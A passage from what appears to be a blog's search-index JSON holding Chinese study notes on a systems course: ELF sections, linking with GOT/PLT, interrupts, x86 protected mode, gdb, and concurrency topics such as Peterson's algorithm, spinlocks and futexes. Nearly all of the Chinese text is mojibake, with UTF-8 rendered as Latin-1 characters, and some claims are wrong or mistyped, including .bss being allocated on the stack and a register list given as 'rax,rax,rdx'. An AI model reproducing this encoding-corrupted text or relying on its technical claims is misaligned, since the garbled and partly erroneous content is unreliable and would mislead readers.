å®šä¹‰äº†ELFé­”æ•°ã€ç‰ˆæœ¬ã€å°ç«¯/å¤§ç«¯ã€æ“ä½œç³»ç»Ÿå¹³å°ã€ç›®æ ‡æ–‡ä»¶çš„ç±»å‹ã€æœºå™¨ç»“æ„ç±»å‹ã€èŠ‚å¤´è¡¨çš„èµ·å§‹ä½ç½®å’Œé•¿åº¦ç­‰ â€¢ .text èŠ‚ ç¼–è¯‘æ±‡ç¼–åçš„ä»£ç éƒ¨åˆ† â€¢ .rodata èŠ‚ åªè¯»æ•°æ®ï¼Œå¦‚ printf æ ¼å¼ä¸²ã€switch è·³è½¬è¡¨ç­‰ â€¢ .data èŠ‚ å·²åˆå§‹åŒ–ä¸”åˆå€¼ä¸ä¸º0çš„å…¨å±€/é™æ€å˜é‡ â€¢ .bss èŠ‚ æœªåˆå§‹åŒ–æˆ–åˆå€¼ä¸º0çš„å…¨å±€/é™æ€å˜é‡ï¼Œä»…æ˜¯å ä½ç¬¦ï¼Œä¸å ä»»ä½•å®é™…ç£ç›˜ç©ºé—´ã€‚åŒºåˆ†bssèŠ‚æ˜¯ä¸ºäº†ç©ºé—´æ•ˆç‡\nQA:ä¸ºä»€ä¹ˆbssèŠ‚ä¸å ä»»ä½•å®é™…ç£ç›˜ç©ºé—´ï¼Ÿ\nåªæœ‰åœ¨è¿è¡Œçš„æ—¶å€™æ‰ä¼šåœ¨æ ˆä¸Šåˆ†é…ç©ºé—´å»ç”¨ï¼Œä¸è¢«å…¶ä»–å¤–éƒ¨æ–‡ä»¶æ‰€è®¿é—®\nQAï¼šä¸ºä»€ä¹ˆè¦æŠŠç¨‹åºå’ŒæŒ‡ä»¤åˆ†å¼€æ”¾ï¼Ÿ\næŒ‡ä»¤cacheå¯æ‰§è¡Œä¸å¯è¯»ä¸å¯å†™ï¼Œæ•°æ®cacheå¯è¯»/å¯å†™ æ•°æ®ä¼šå¾ˆå¤šæ¬¡è¦†ç›–ï¼Œä½†æ˜¯æŒ‡ä»¤ä¸ä¼šè¢«åå¤è¦†ç›–ï¼Œä¸‹æ¬¡å†æ¬¡ç¼“å­˜å‘½ä¸­ï¼Œä¸ä¼šå› ä¸ºæ•°æ®è¦†ç›–è€ŒæŒ‡ä»¤cacheæ¸…ç©º ç¬¦å·è§£æå’Œé‡å®šä½ â€¢ ç¡®å®šæ ‡å·å¼•ç”¨å…³ç³» â€¢ å¦‚ä½•å¡«ç©ºï¼Ÿ\nå› ä¸ºå°ç«¯æ³•ï¼Œyçš„åœ°å€0x2ea5+116f\nstaticé“¾æ¥\næŒ‰ç…§ç›¸åŒæ–‡ä»¶æŠŠä¸‰ä¸ªlocatableæ–‡ä»¶ç»„åˆï¼Œå¤–éƒ¨ç¬¦å· QAï¼šèƒ½å¦ç›´æ¥ç”¨ldé“¾æ¥ï¼Œå¦‚ld a.o b.o?\nä¸è¡Œï¼Œæ²¡æœ‰é“¾æ¥æ ‡å‡†åº“ï¼Œæ‰¾ä¸åˆ°_start,mainç­‰å‡½æ•°\nè·‘ä¸€ä¸ª.outæ–‡ä»¶ï¼Ÿ\nåˆ†é…ä¸€ä¸ªè¿›ç¨‹å†…å­˜ï¼Œå¯æ‰§è¡Œæ–‡ä»¶ä¸è™šæ‹Ÿåœ°å€ç©ºé—´é—´çš„å­˜å‚¨å™¨æ˜ åƒç”±ABIè§„èŒƒå®šä¹‰\nä¸ºä»€ä¹ˆè¦åŠ¨æ€é“¾æ¥ï¼Ÿå»æ‰-fno-picå’Œstatic\nå ç”¨ç©ºé—´æ›´å°\nåªç”¨ç»´æŠ¤è¡¨å°±è¡Œ\nGOTè¡¨ call *table[PRINTF]\nå»¶è¿Ÿç»‘å®šä½¿ç”¨PLTè¡¨æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ åªæœ‰è°ƒç”¨åˆ°çš„å‡½æ•°ï¼Œæ‰å»å›å¡«è·³è½¬\n1 2 3 4 printf@plt: jmp *table[PRINTF] push $PRINTF call resolve ä¸­æ–­ä¸åˆ†æ—¶å¤šä»»åŠ¡ QAï¼šwhile(1);æ˜¯å¦ä¼šæŠŠç”µè„‘å¡æ­»ï¼Ÿ\nç±»ä¼¼äºcallæŒ‡ä»¤ï¼Ÿå‘ç”Ÿä¸­æ–­å¤„ç†ï¼Œå†è¿”å›ret\nä¸­æ–­å¤„ç†\nè‡ªåŠ¨ä¿å­˜RIP,CS,RFLAGS,RSP,SS,Error Code æ ¹æ®ä¸­æ–­/å¼‚å¸¸å¥½è·³è½¬åˆ°å¤„ç†ç¨‹åºï¼Œç‰¹æƒçº§åˆ‡æ¢å›è§¦å‘å †æ ˆåˆ‡æ¢ int $0x80å¯ä»¥äº§ç”Ÿ128å·å¼‚å¸¸ï¼Œä¸»åŠ¨å”¤èµ·ä¸­æ–­\næ—¶é’Ÿï¼Œé”®ç›˜32å·ä¸­æ–­ï¼ˆIDTï¼‰\nCLI:Clear Interrupt Flag å…³ä¸­æ–­ï¼Œä¸æ˜¯ç»™ä½æƒé™ç”¨çš„ï¼Œ\nç³»ç»Ÿè°ƒç”¨ï¼Œæ‰“æ–­ç‚¹ï¼ŒintæŒ‡ä»¤éƒ½æ˜¯ç¨‹åºå†…éƒ¨å¼•å‘å¼‚å¸¸\nä¸€ç±»æ˜¯å¯å¤„ç†ï¼Œæœ€ç»ˆè¿˜å¾—å›åˆ°ä¸­æ–­å‘ç”Ÿå¤„next PCï¼Œä¿å­˜ç°åœºï¼Œæ¢å¤ç°åœºï¼ˆåˆ†æ—¶å¤šä»»åŠ¡ï¼Œæ—¶é’Ÿä¸­æ–­éƒ½æ˜¯è¿™ç§ï¼‰\nè€Œä¸å¯æ¢å¤çš„ï¼Œç¨‹åºå‡ºé”™ï¼Œè§¦å‘ERROR CODE0\nQA:ä¿å­˜ç°åœºï¼Œæ¢å¤ç°åœº ä»€ä¹ˆå€¼ï¼Ÿ\n","date":"2025-03-17T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/ics-pa%E7%AC%94%E8%AE%B0/","title":"ICS-PAç¬”è®°"},{"content":"ç”±äºå¼•å¯¼åŒºç©ºé—´æœ‰é™ï¼Œåªæœ‰512ä¸ªå­—èŠ‚ï¼Œæ•…æ‰“ç®—æŠŠç¨‹åºç¼–è¯‘æˆcomæ–‡ä»¶ï¼Œç„¶åè®©DOSæ‰§è¡Œ\n1 nasm pmtest1.asm -o pmtest1.com ä¸€äº›æŒ‚è½½é—®é¢˜ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 1ã€å†™å…¥ç©ºç™½å†…å®¹ï¼š dd if=/dev/null of=pm.img bs=512 count=1 conv=notrunc 2ã€ä½¿ç”¨ losetup å‘½ä»¤ï¼Œå°† data.img ä½œä¸º loop device ä½¿ç”¨ï¼š sudo losetup /dev/loop0 pm.img 3ã€ç„¶åï¼Œæ ¼å¼åŒ–è¿™ä¸ª loop deviceï¼š sudo mkfs.msdos /dev/loop0 4ã€æ£€æŸ¥æ–‡ä»¶ç³»ç»Ÿï¼š sudo fsck.msdos /dev/loop0 5ã€åˆ é™¤ loop deviceï¼š sudo losetup -d /dev/loop0 è¿™æ—¶å€™ï¼Œpm.img å·²ç»æ ¼å¼åŒ–å®Œæˆï¼Œå¯ä»¥ä½œä¸ºä¸€ä¸ªè½¯ç›˜é•œåƒä½¿ç”¨ã€‚ç”¨fileæŸ¥çœ‹ï¼Œç»“æœä¸ºï¼š pm.img: DOS floppy 1440k, x86 hard disk boot sector å†æ¬¡è¾“å…¥ sudo mount -o loop pm.img /mnt/floppy 6ã€æŒ‚è½½æˆåŠŸï¼ï¼ï¼ ä¹‹åæ­£å¸¸æŒ‚åœ¨å°±è¡Œ\n1 2 3 sudo cp pmtest1.com /mnt/floppy(å…ˆè¦åœ¨åˆ›å»ºæŒ‚è½½æ–‡ä»¶å¤¹ï¼ŒUbuntuå¥½åƒæ²¡æœ‰è½¯ç›˜é©±åŠ¨ï¼Œä¸­é€”æ¢kaliå»äº†ï¼Œä¹Ÿæ˜¯åŸºäºDebian) sudo umount /mnt/floppy ä¿æŠ¤æ¨¡å¼ ä»å®æ¨¡å¼è·³è½¬åˆ°ä¿æŠ¤æ¨¡å¼\n1.å‡†å¤‡GDTï¼ˆå…¨å±€æè¿°ç¬¦è¡¨ï¼‰\n2.ç”¨lgdtåŠ è½½gdtr\n1 lgdt [GdtPtr] 3.æ‰“å¼€A20,ï¼Œè¯•å›¾è®¿é—®åˆ°1MBä¸Šçš„å†…å­˜\n4.è®¾ç½®cr0çš„PEä½ï¼Œ0å˜1\n5.è·³è½¬ï¼Œè¿›å…¥ä¿æŠ¤æ¨¡å¼\n1 jmp dword SelectorCode32:0 è·³è½¬ç›®æ ‡æ˜¯æè¿°ç¬¦DESCâ€”â€”CODE32å¯¹åº”æ®µçš„é¦–åœ°å€ï¼Œå³æ ‡å·LABEL_SEG_CODE32å¤„\nPä½ï¼Œp=1è¡¨ç¤ºæ®µåœ¨å†…å­˜ä¸­å­˜åœ¨ï¼Œp=0è¡¨ç¤ºæ®µåœ¨å†…å­˜ä¸­ä¸å­˜åœ¨\nDPLæè¿°ç¬¦ç‰¹æƒçº§ï¼Œç‰¹æƒçº§å¯ä»¥æ˜¯0ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œæ•°å­—è¶Šå°ç‰¹æƒçº§è¶Šå¤§\nSä½ï¼Œæ•°æ®æ®µ/ä»£ç æ®µæè¿°ç¬¦ï¼Œç³»ç»Ÿæ®µ/é—¨æè¿°ç¬¦\nåœ¨ä¿æŠ¤æ¨¡å¼ä¸‹æ‰§è¡Œæ±‡ç¼–ä»£ç mov ds:[si], axçš„å¤§è‡´æ­¥éª¤å¦‚ä¸‹ï¼š\né¦–å…ˆCPUéœ€è¦æŸ¥æ‰¾GDTåœ¨å†…å­˜ä¸­ä½ç½®ï¼ŒGDTçš„ä½ç½®ä»GDTRå¯„å­˜å™¨ä¸­ç›´æ¥è·å– ç„¶åæ ¹æ®DSå¯„å­˜å™¨å¾—åˆ°ç›®æ ‡æ®µæè¿°ç¬¦çš„ç‰©ç†åœ°å€ è®¡ç®—å‡ºæè¿°ç¬¦ä¸­çš„æ®µåŸºå€çš„å€¼åŠ ä¸ŠSIå¯„å­˜å™¨å­˜å‚¨çš„åç§»é‡çš„ç»“æœï¼Œè¯¥ç»“æœä¸ºç›®æ ‡ç‰©ç†åœ°å€ å°†AXå¯„å­˜å™¨ä¸­çš„æ•°æ®å†™å…¥åˆ°ç›®æ ‡ç‰©ç†åœ°å€\nCç¨‹åºçš„çŠ¶æ€æœºæ¨¡å‹ çŠ¶æ€=å †+æ ˆ\nåˆå§‹çŠ¶æ€=main()çš„ç¬¬ä¸€æ¡è¯­å¥\nè¿ç§»=æ‰§è¡Œä¸€æ¡ç®€å•è¯­å¥\nçŠ¶æ€æœºï¼Œå–æŒ‡ä»¤ï¼Œæ‰§è¡Œ\nå¤ä¹ ä¸‹gdbè°ƒè¯•ï¼Œå¤§å¤šæ•°éƒ½å¿«å¿˜å…‰äº†\npwngdbè°ƒè¯•ï¼šstart;b \u0026lt;æ–­ç‚¹\u0026gt;ï¼›r;layout asm(äºŒè¿›åˆ¶è°ƒè¯•);siæ‰§è¡Œä¸€æ¡æŒ‡ä»¤ï¼›x $rbp;si;rbpå¯„å­˜å™¨å€¼æ”¹å˜ï¼›wa $raxç›‘æ§æ–­ç‚¹\nç¨‹åºï¼Ÿ\nç¨‹åºæ˜¯ä¸€ä¸ªçŠ¶æ€æœºï¼Œåˆå§‹çŠ¶æ€ï¼šå¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œä»PCå¼€å§‹æ‰§è¡Œï¼Œçº¿æ€§ï¼Œåˆ†å‰ï¼ˆå¦‚randï¼‰ï¼Œç¨‹åºæ‰§è¡Œçš„ç»“æœä¸æ˜¯å”¯ä¸€çš„\nä¸€æ¡ç‰¹æ®Šçš„æŒ‡ä»¤syscall(),è¿›å…¥å†…æ ¸æ¨¡å¼ï¼ŒæŠŠ\u0026hellip;.äº¤ç»™æ“ä½œç†Šï¼Œä»»å…¶ä¿®æ”¹ï¼Œç¨‹åº=è®¡ç®—+syscall()\nå¦‚ä½•å†™ä¸€ä¸ªæœ€å°çš„helloï¼Œworldç¨‹åº?\nå¼ºè¡Œç¼–è¯‘+é“¾æ¥\nldå¤±è´¥ï¼ŒæŠŠmainæ”¹æˆ_start\nä½†æ˜¯Segmentation Faultï¼Œretqå°±æ˜¯æŠŠrspåŠ 8ï¼Œè°ƒè¯•å‘ç°æ˜¯åˆå§‹çŠ¶æ€æ— æ³•è¿”å›\nè§£å†³åŠæ³•ï¼šsyscall\n1 2 3 4 5 #include \u0026lt;sys/syscall.h\u0026gt; int main() { syscall(SYS_exit, 42); } man syscall\nç³»ç»Ÿè°ƒç”¨å‚æ•°ï¼Œå¦‚åœ¨x86-64ï¼Œsyscallæ”¾åœ¨rax,rax,rdxï¼Œç»ˆäºæ˜ç™½pwnçš„payloadå¦‚ä½•æ„é€ äº†\nä¸€äº›æœ‰è¶£çš„ç»ˆç«¯å‘½ä»¤\n1 2 3 4 5 telnet towel.blinkenlights.nl æ”¾ç”µå½± dialog --msgbox \u0026#39;Hello\u0026#39; 8 32 ssh sshtron.zachlatta.com(è´ªåƒè›‡) ç¼–è¯‘å™¨ cä»£ç çŠ¶æ€æœºï¼ˆæœ‰äº›åœ°æ–¹ä¸å¯ä¼˜åŒ–ï¼Œå¦‚ç³»ç»Ÿè°ƒç”¨æ˜¯ä¸å¯ä¼˜åŒ–çš„ï¼‰ï¼Œæ±‡ç¼–ä»£ç çŠ¶æ€æœºï¼Œå¦‚ä½•åˆ‡æ¢?\nC=compile(S)\næ­£ç¡®çš„ç¼–è¯‘ï¼ŸæŠŠCä»£ç ä¸­ä¸å¯ä¼˜åŒ–çš„éƒ¨åˆ†éƒ½è¢«æ­£ç¡®çš„ç¿»è¯‘åˆ°æ±‡ç¼–ä¸Š\nxxd:LinuxæŸ¥çœ‹äºŒè¿›åˆ¶ä»£ç \nå¸¸è§åº”ç”¨ç¨‹åº ç¨‹åºæ˜¯çŠ¶æ€æœºè§†è§’\nGNU Coreutils/busybox -\u0026gt;ç³»ç»Ÿ/å·¥å…·ç¨‹åº(apt,ssh,vim) â€”â€”\u0026gt;åº”ç”¨ç¨‹åº\nQAï¼šHello World Cç¨‹åºæ‰§è¡Œçš„ç¬¬ä¸€æ¡æŒ‡ä»¤åœ¨å“ªé‡Œ?\n/lib64/ld-linux-x86-64.so\nå¯ä»¥è‡ªè¡Œä¿®æ”¹å“ˆ\n1 2 3 4 5 6 straceè¿½è¸ª strace f.out strace -f gcc -c f.c gcc --verbose å¹¶å‘ Human beings are sequential agents\nå•çº¿ç¨‹æ¯ä¸€æ­¥éƒ½æ˜¯ç¡®å®šçš„\nå¤šçº¿ç¨‹ï¼šå…¨å±€å˜é‡å’Œå †åŒºå…±äº«ï¼Œæœ‰å‡ ä¸ªç‹¬ç«‹çš„æ ˆå¸§é“¾ï¼Œçº¿ç¨‹ï¼šæ¯ä¸ªæ ˆå¸§é‡Œéƒ½æœ‰PCå’Œå…¶ä»–å±€éƒ¨å˜é‡ï¼Œå¹¶å‘ç³»ç»Ÿæ¯ä¸€æ­¥éƒ½ä¸ç¡®å®šï¼Œswitché€‰æ‹©çº¿ç¨‹1/2/3\u0026hellip;\u0026hellip;?\nHuman beings are sequential creature.\ntopæ˜¾ç¤ºCPUä½¿ç”¨æƒ…å†µ\næ˜¯ä¸æ˜¯çº¿ç¨‹å…±å­˜å†…å­˜ï¼Ÿ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026#34;thread.h\u0026#34; int x = 0; void Thello(int id) { usleep(id * 100000); printf(\u0026#34;Hello from thread #%c\\n\u0026#34;, \u0026#34;123456789ABCDEF\u0026#34;[x++]); } int main() { for (int i = 0; i \u0026lt; 10; i++) { create(Thello); } } æ”¹å˜int x=0å±€éƒ¨orå…¨å±€ï¼Œå¯ä»¥çœ‹åˆ°ä¸ä¸€æ ·çš„è¾“å‡º\nå¦‚ä½•è¯æ˜çº¿ç¨‹å…·æœ‰ç‹¬ç«‹å †æ ˆï¼Ÿ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include \u0026#34;thread.h\u0026#34; __thread char *base, *cur; // thread-local variables __thread int id; // objdump to see how thread-local variables are implemented __attribute__((noinline)) void set_cur(void *ptr) { cur = ptr; } __attribute__((noinline)) char *get_cur() { return cur; } void stackoverflow(int n) { set_cur(\u0026amp;n); if (n % 1024 == 0) { int sz = base - get_cur();//æ ˆåº•å’Œæ ˆé¡¶åŒºåˆ« printf(\u0026#34;Stack size of T%d \u0026gt;= %d KB\\n\u0026#34;, id, sz / 1024); } stackoverflow(n + 1);//æ— é™åˆ¶çš„åˆ›å»ºæ ˆ } void Tprobe(int tid) { id = tid; base = (void *)\u0026amp;tid; //æŒ‡å‘tidåœ°å€ stackoverflow(0); } int main() { setbuf(stdout, NULL); for (int i = 0; i \u0026lt; 4; i++) { create(Tprobe); } } å¤šçº¿ç¨‹æ‰§è¡Œï¼ŒåŒæ—¶è®¿é—®ç›¸åŒçš„å…±äº«å˜é‡ï¼Œä¼šå‡ºé—®é¢˜\nåŸå­æ€§çš„ä¸§å¤± å¦‚ä½•æŠŠç¨‹åºé™åˆ¶åˆ°å•å¤„ç†å™¨ä¸Šï¼Ÿ\nå•å¤„ç†å™¨å¤šçº¿ç¨‹\nçº¿ç¨‹åœ¨è¿è¡Œæ—¶å¯èƒ½è¢«ä¸­æ–­ï¼Œåˆ‡æ¢åˆ°å¦ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œ å¤šå¤„ç†å™¨å¤šçº¿ç¨‹\nçº¿ç¨‹æ ¹æœ¬å°±æ˜¯å¹¶è¡Œæ‰§è¡Œçš„ printfè¿˜èƒ½åœ¨å¤šçº¿ç¨‹è°ƒç”¨å—ï¼Ÿ\nprintfä¸ä¼šåœ¨å¤šçº¿ç¨‹ä¸­å‡ºç°é—®é¢˜ï¼Œæ¯”å¦‚ä¸€ä¸ªå­—ç¬¦æ’å…¥å¦ä¸€ä¸ªå­—ç¬¦ï¼Œå› ä¸ºæœ‰ç¼“å†²åŒºï¼Œä¸æ˜¯puts\nasm volatile(\u0026quot;\u0026quot;:::\u0026ldquo;memory\u0026rdquo;)æ’å…¥æ±‡ç¼–æŒ‡ä»¤ï¼Œå‘Šè¯‰æ±‡ç¼–å™¨ä¸è¦ä¼˜åŒ–ï¼Œåˆ«çš„çº¿ç¨‹å¯èƒ½è¯»å†™å†…å­˜\nå¹¶å‘ç¨‹åºæœ€å¤§çš„éº»çƒ¦ï¼Ÿ\nmem-ordering.c\nflag=0æˆ–1ï¼Œé€šè¿‡å¼‚æˆ–ç®—æ³•ï¼Œæ¥å†³å®šæ‰§è¡Œå“ªä¸ª\n1 ./mem-ordering |head -n 10000 |sort |uniq -c ç°ä»£å¤„ç†å™¨ åŠ¨æ€ç¼–è¯‘å™¨\nå•ä¸ªå¤„ç†å™¨æŠŠæ±‡ç¼–ä»£ç ç¼–è¯‘æˆæ›´å°çš„uops\nfetch-\u0026gt;issueï¼ˆå¯ä»¥åŒæ—¶ï¼‰-\u0026gt;execuite-\u0026gt;commit\nåœ¨ä»»ä½•æ—¶åˆ»ï¼Œå¤„ç†å™¨éƒ½ç»´æŠ¤ä¸€ä¸ªuopçš„æ± å­ï¼Œæ¯ä¸€å‘¨æœŸå‘æ± å­è¡¥å……å°½å¯èƒ½å¤šçš„uopï¼Œæ‰§è¡Œå°½å¯èƒ½å¤šçš„uopï¼Œè¿™ä¹Ÿæ˜¯ä¹±åºæ‰§è¡Œçš„åŸå› \nå¤šå¤„ç†å™¨é—´å³ä½¿å¯è§æ€§çš„ä¸§å¤±\nå¦‚æœå†™xå‘ç”Ÿcache missï¼Œå»¶è¿Ÿå†™å…¥ï¼Œæ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤\nâ€œmfenceâ€ä¿è¯å¤šå¤„ç†å™¨ä¹‹é—´çš„ä¸€è‡´æ€§ï¼Œåªæœ‰å†™å…¥å†…å­˜ï¼Œæ‰èƒ½æ‰§è¡Œä¸‹ä¸€æ¡è¯­å¥\næ€»ç»“ å¹¶å‘ç¨‹åº=å¤šä¸ªæ‰§è¡Œæµï¼Œå…±äº«å†…å­˜çš„çŠ¶æ€æœºï¼Œcè¯­è¨€æ‰§è¡Œæµ\nthread.h=create+join\nå¹¶å‘æ‰§è¡Œä¸åŸå­ï¼Œèƒ½ä¹±åºã€‚ä¸ç«‹å³å¯è§\nç°ä»£å¤„ç†å™¨å°±æ˜¯åŠ¨æ€æ•°æ®åˆ†æå™¨ï¼ŒæŒ‡ä»¤æµï¼Œæ•°æ®æµï¼Œåªè¦åšå‡ºç›¸åº”çš„åº”å¯¹ï¼Œå°±èƒ½è·‘çš„å¿«\näº’æ–¥ï¼šä¿è¯ä¸¤ä¸ªçº¿ç¨‹ä¸èƒ½åŒæ—¶æ‰§è¡Œä¸€æ®µä»£ç \nåˆ©ç”¨é”ï¼Œäº’æ–¥é”ï¼ŒåŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹æŒæœ‰é”ï¼Œçº¿ç¨‹åœ¨è¿›å…¥ä¸´ç•ŒåŒºå‰å¿…é¡»å…ˆè·å–é”ï¼Œçº¿ç¨‹åœ¨ç¦»å¼€ä¸´ç•ŒåŒºåå¿…é¡»é‡Šæ”¾é”ï¼Œå¿…é¡»ç¡®ä¿åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½ç‹—æ‰§è¡Œä¸´ç•ŒåŒºä»£ç \nPetersonç®—æ³• store()æ”¹å˜çŠ¶æ€ï¼Œèµ‹å€¼\nload()çœ‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int x = 0, y = 0, turn = A; void TA() { while (1) { /* PC=1 */ x = 1; /* PC=2 */ turn = B; /* PC=3 */ while (y \u0026amp;\u0026amp; turn == B) ; critical_section(); /* PC=4 */ x = 0; } } void TB() { while (1) { /* PC=1 */ y = 1; /* PC=2 */ turn = A; /* PC=3 */ while (x \u0026amp;\u0026amp; turn == A) ; critical_section(); /* PC=4 */ y = 0; } } QAï¼šå¦‚ä½•ä¿è¯ä¸¤ä¸ªäººèƒ½å®‰å…¨çš„ä¸Šå•æ‰€ï¼Œåªæœ‰storeï¼ˆï¼‰å’Œload()ä¸¤ä¸ªåŠ¨ä½œï¼Ÿ\næ¨¡æ‹Ÿç®—æ³•ï¼ˆPC1,PC2,X,Y,turnï¼‰\nmodef-checker.py\nä¸æ–­è¯•å›¾è¿›å…¥ä¸´ç•ŒåŒºï¼Œåªè¦å˜é‡æ˜¯é”ç€çš„ï¼Œå°±æ‰§è¡Œæ­»å¾ªç¯ï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±é”ä¸Šï¼Œè¿›å…¥ä¸´ç•ŒåŒºï¼Œå‡ºä¸´ç•ŒåŒºï¼ŒæŠŠé”åˆ æ‰\nåœ¨å…±äº«å†…å­˜ä¸Šå®ç°äº’æ–¥ å®ç°äº’æ–¥çš„æ ¹æœ¬å›°éš¾ï¼šå…¬ç†ç³»ç»Ÿä¸å…è®¸åŒæ—¶è¯»/å†™å…±äº«å†…å­˜ï¼Œå³load()å’Œstore()ä¸èƒ½åŒæ—¶æ‰§è¡Œ\nè§£å†³ï¼šå‡è®¾ç¡¬ä»¶èƒ½ä¸ºæˆ‘ä»¬æä¾›ä¸€æ¡â€œç¬é—´å®Œæˆâ€çš„è¯»å†™æŒ‡ä»¤\nå®ç°äº’æ–¥çš„åè®®ï¼Ÿ\nä¸€æ¡exchangeåè®®ï¼Œ0/1çŠ¶æ€è½¬å˜\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 int table =yes; void lock(){ retry: â€‹ int got = xchg(\u0026amp;table,NOPE); â€‹ if (got == NOPE) â€‹ goto retry; â€‹ assert(got == YES); } void unlock(){ â€‹ xchg(\u0026amp;table,YES) } int locked =0; void lock(){while (echg(\u0026amp;locked,1));} void unlock(){xchg(\u0026amp;locked,0);} æ³¨æ„model-checkerå·¥ä½œçš„æ£€éªŒ\nåŸå­æŒ‡ä»¤çš„æ¨¡å‹ ä¿è¯lockæŒ‡ä»¤æœ‰é¡ºåºå¹¶èƒ½æŒ‰é¡ºåºæ‰§è¡Œï¼Œåé¢çš„çº¿ç¨‹èƒ½çœ‹è§å‰é¢çš„çº¿ç¨‹ï¼Œä¿è¯ä¹‹å‰çš„storeéƒ½å†™å…¥å†…å­˜ï¼Œä¿è¯load/storeä¸ä¸åŸå­æŒ‡ä»¤ä¹±åº\natomic test-and-set\nlock xchg\nreg=load(x);if (reg==XX){store(x,XX)}\nlock add\nt=load(x);t++;store(x,t)\nä¸€è¯»ä¸€å†™\nload,exec,store\nLOAD-Reserved/Store-Conditional æ‰“æ ‡è®°\n1 2 3 4 5 6 int cas(int *addr, int cmp_val, int new_val) { int old_val = *addr; if (old_val == cmp_val) { *addr = new_val; return 0; } else { return 1; } } è‡ªæ—‹é”çš„ç¼ºé™· æ¯ä¸ªCPUä¸Šä¸åŒçº¿ç¨‹ï¼Œå¯ä»¥åˆ‡æ¢ï¼Œé™¤äº†è¿›å…¥ä¸´ç•ŒåŒºçš„çº¿ç¨‹ï¼Œå…¶ä»–å¤„ç†å™¨ä¸Šçš„çº¿ç¨‹éƒ½åœ¨ç©ºè½¬ï¼Œè·å¾—è‡ªæ—‹é”çš„çº¿ç¨‹å¯èƒ½è¢«æ“ä½œç³»ç»Ÿåˆ‡æ¢å‡ºå»\nè‡ªæ—‹ (å…±äº«å˜é‡) ä¼šè§¦å‘å¤„ç†å™¨é—´çš„ç¼“å­˜åŒæ­¥ï¼Œå»¶è¿Ÿå¢åŠ \nåŒä¸€ä»½è®¡ç®—ä»»åŠ¡ï¼Œæ—¶é—´ (CPU cycles) å’Œç©ºé—´ (mapped memory) ä¼šéšå¤„ç†å™¨æ•°é‡çš„å¢é•¿è€Œå˜åŒ–ã€‚\nè‡ªæ—‹é”çš„å¥½å¤„ æ›´å¿«çš„ fast path xchg æˆåŠŸ â†’ ç«‹å³è¿›å…¥ä¸´ç•ŒåŒºï¼Œå¼€é”€å¾ˆå° æ›´æ…¢çš„ slow path xchg å¤±è´¥ â†’ æµªè´¹ CPU è‡ªæ—‹ç­‰å¾… è‡ªæ—‹é”çš„ä½¿ç”¨åœºæ™¯\nnoï¼š\næŒæœ‰è‡ªæ—‹é”æ—¶ç¦æ­¢æ‰§è¡Œæµåˆ‡æ¢(å¾ˆå±é™©çš„æ“ä½œ)ï¼Ÿ ä¸´ç•ŒåŒºå‡ ä¹ä¸æ‹¥å µï¼Ÿ æ“ä½œç³»ç»Ÿå¯ä»¥æ“çºµå…³ä¸­æ–­å’ŒæŠ¢å ï¼Œä¿è¯é”çš„æŒæœ‰è€…åœ¨å¾ˆçŸ­çš„æ—¶é—´å‘¢ä½ å¯ä»¥é‡Šæ”¾é”\nå¦‚ä½•å®ç°ä¸€ä¸ªå¾ˆé•¿çš„ä¸´ç•ŒæœŸï¼Ÿ\næŠŠé”çš„å®ç°æ”¾åˆ°æ“ä½œç³»ç»Ÿé‡Œå°±å¥½å•¦ï¼\n1 syscall(SYSCALL_lock, \u0026amp;lk); è¯•å›¾è·å¾— lkï¼Œä½†å¦‚æœå¤±è´¥ï¼Œå°±åˆ‡æ¢åˆ°å…¶ä»–çº¿ç¨‹ 1 syscall(SYSCALL_unlock, \u0026amp;lk); é‡Šæ”¾ lkï¼Œå¦‚æœæœ‰ç­‰å¾…é”çš„çº¿ç¨‹å°±å”¤é†’ èåˆè‡ªæ—‹é”å’Œäº’æ–¥é”çš„å¥½å¤„ï¼Ÿ\nFutex Fast path: ä¸€æ¡åŸå­æŒ‡ä»¤ï¼Œä¸Šé”æˆåŠŸç«‹å³è¿”å›\nSlow path: ä¸Šé”å¤±è´¥ï¼Œæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ç¡çœ \nçº¿ç¨‹åº“é‡Œçš„é”ç»å¤§æƒ…å†µä¸‹ä¸ä¼šå¯åŠ¨ç³»ç»Ÿè°ƒç”¨ï¼Œè€Œæ˜¯åŸå­è°ƒç”¨\næ€»ç»“ QAï¼šå¦‚ä½•åœ¨å¤šå¤„ç†å™¨ä¸Šå®ç°äº’æ–¥ï¼Ÿ\nåœ¨å¤šå¤„ç†å™¨ç³»ç»Ÿä¸Šå®ç°äº’æ–¥æ˜¯ç¡®ä¿å¤šä¸ªå¤„ç†å™¨æˆ–æ ¸å¿ƒåœ¨è®¿é—®å…±äº«èµ„æºæ—¶ä¸ä¼šå‘ç”Ÿå†²çªçš„å…³é”®ï¼Œåˆ©ç”¨é”\nå¹¶å‘æ§åˆ¶ 